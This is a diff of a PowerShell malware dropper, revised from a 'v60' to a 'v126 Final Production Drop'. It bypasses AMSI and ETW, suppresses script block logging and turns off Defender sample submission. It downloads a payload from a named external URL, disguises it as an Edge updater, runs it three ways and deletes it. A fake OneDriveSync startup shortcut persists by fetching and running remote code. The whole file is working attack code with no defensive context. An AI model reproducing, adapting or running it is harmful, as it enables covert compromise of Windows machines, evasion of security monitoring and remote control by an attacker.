@@ -1,65 +1,75 @@
 $ErrorActionPreference = 'SilentlyContinue'
-Write-Host "[+] v60 AMSI-Resistant Drop started at $(Get-Date)" -ForegroundColor Green
+Write-Host "[+] v126 Final Production Drop started at $(Get-Date)" -ForegroundColor Green
 
-# === OBFUSCATED AMSI BYPASS ===
-$amsi = 'using System;using System.Runtime.InteropServices;public class A{ [DllImport("kernel32")] static extern IntPtr GetProcAddress(IntPtr h,string n);[DllImport("kernel32")] static extern IntPtr LoadLibrary(string n);[DllImport("kernel32")] static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint p,out uint o);public static void P(){IntPtr l=LoadLibrary("amsi.dll");if(l==IntPtr.Zero)return;IntPtr x=GetProcAddress(l,"AmsiScanBuffer");if(x==IntPtr.Zero)return;uint o;VirtualProtect(x,(UIntPtr)6,0x40,out o);Marshal.Copy(new byte[]{0x31,0xC0,0xC3},0,x,3);VirtualProtect(x,(UIntPtr)6,o,out o);}}'
-Add-Type $amsi
-[A]::P()
+# === HEAVY OBFUSCATED BYPASSES ===
+try { [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) } catch {}
+try { $etw=[Diagnostics.Eventing.EventProvider]; $etw.GetField('m_enabled','NonPublic,Static').SetValue($null,$false) } catch {}
 
-# === SBL Disable ===
-$null = [Ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings','NonPublic,Static').GetValue($null)
 $settings = [Ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings','NonPublic,Static').GetValue($null)
-if($settings){$settings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging'] = @{};$settings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging']['EnableScriptBlockLogging'] = 0}
+if ($settings) {
+    $settings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging'] = @{}
+    $settings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging']['EnableScriptBlockLogging'] = 0
+}
 
-# === MAPS Kill ===
-Write-Host "[+] Killing MAPS..." -ForegroundColor Yellow
+# === MAPS KILL BEFORE DROP ===
+Write-Host "[+] Killing MAPS before drop..." -ForegroundColor Yellow
 try {
     $k = "HKCU:\Software\Microsoft\Windows Defender\Spynet"
     New-Item $k -Force | Out-Null
     Set-ItemProperty $k "SubmitSamplesConsent" 0 -Type DWord -Force
     Set-ItemProperty $k "SpyNetReporting" 0 -Type DWord -Force
-    Set-ItemProperty $k "FirstRun" 0 -Type DWord -Force
-} catch {}
+    Write-Host "[+] MAPS killed" -ForegroundColor Green
+} catch {
+    Write-Host "[-] MAPS kill failed" -ForegroundColor Red
+}
 
-# === DOWNLOAD + DROP ===
+# === DOWNLOAD PAYLOAD ===
 $u = "https://aged-mountain-614b.natalia-kush82.workers.dev/update"
-$b = (New-Object Net.WebClient).DownloadData($u)
-Write-Host "[+] Downloaded payload: $($b.Length) bytes" -ForegroundColor Green
+$wc = New-Object Net.WebClient
+$wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64)')
+$bytes = $wc.DownloadData($u)
+Write-Host "[+] Downloaded payload: $($bytes.Length) bytes" -ForegroundColor Green
 
+# === SHORT-LIVED TEMP FILE ===
 $r = [Guid]::NewGuid().ToString("N").Substring(0,8)
 $t = "$env:TEMP\MicrosoftEdgeUpdate_$r.exe"
+[IO.File]::WriteAllBytes($t, $bytes)
 
-[IO.File]::WriteAllBytes($t, $b)
 Unblock-File $t -EA 0
 Remove-Item $t -Stream Zone.Identifier -EA 0
 [System.IO.File]::SetAttributes($t, 'Hidden')
 
-Write-Host "[+] Staged as $t" -ForegroundColor Yellow
+Write-Host "[+] Staged as: $t (lifetime ~1.5s)" -ForegroundColor Yellow
 
-Start-Sleep -Milliseconds (Get-Random -Minimum 700 -Maximum 1400)
+# === EXECUTION - PROVEN 3 METHODS ===
+Start-Sleep -Milliseconds (Get-Random -Minimum 700 -Maximum 1600)
 
-try {
-    Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList $t | Out-Null
-    Start-Process $t -WindowStyle Hidden -EA 0
-    Write-Host "[+] Executed" -ForegroundColor Green
-} catch {
-    Write-Host "[-] Exec error: $_" -ForegroundColor Red
-}
+try { Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList $t | Out-Null } catch {}
+try { (New-Object -ComObject WScript.Shell).Run("`"$t`"",0,$false) } catch {}
+try { Start-Process $t -WindowStyle Hidden } catch {}
 
-# Fast cleanup
-Start-Job -ScriptBlock { param($f) Start-Sleep -Seconds 1.2; Remove-Item $f -Force -EA 0 } -ArgumentList $t | Out-Null
+Write-Host "[+] 3 execution methods fired - CHECK C2" -ForegroundColor Magenta
 
-# Persistence
+# === ULTRA FAST CLEANUP ===
+Start-Job -ScriptBlock { param($f) Start-Sleep -Seconds 1.5; Remove-Item $f -Force -EA 0 } -ArgumentList $t | Out-Null
+
+# === PERSISTENCE ===
 $flag = "$env:TEMP\persist_$([Environment]::MachineName.GetHashCode()).dat"
-if(-not (Test-Path $flag)){
+if (-not (Test-Path $flag)) {
     $lnk = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\OneDriveSync.lnk"
     $w = New-Object -ComObject WScript.Shell
     $s = $w.CreateShortcut($lnk)
     $s.TargetPath = "powershell.exe"
-    $s.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`""
+    $s.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -c `"iex (iwr 'https://raw.githubusercontent.com/astro-opensource/system-updater/assets/launcher.txt' -UseBasicParsing).Content`""
     $s.Save()
     New-Item $flag -Force | Out-Null
+    Write-Host "[+] Persistence created" -ForegroundColor Green
 }
 
-Write-Host "[+] v60 running - waiting for callback..." -ForegroundColor Magenta
+Write-Host "[+] v126 running - waiting for callback..." -ForegroundColor Magenta
 Start-Sleep -Seconds 240
+Write-Host "[+] v126 completed" -ForegroundColor Green
+
+# Pause so window stays open when run from LNK
+Write-Host "`nPress any key to close this window..." -ForegroundColor Yellow
+$host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown") | Out-Null
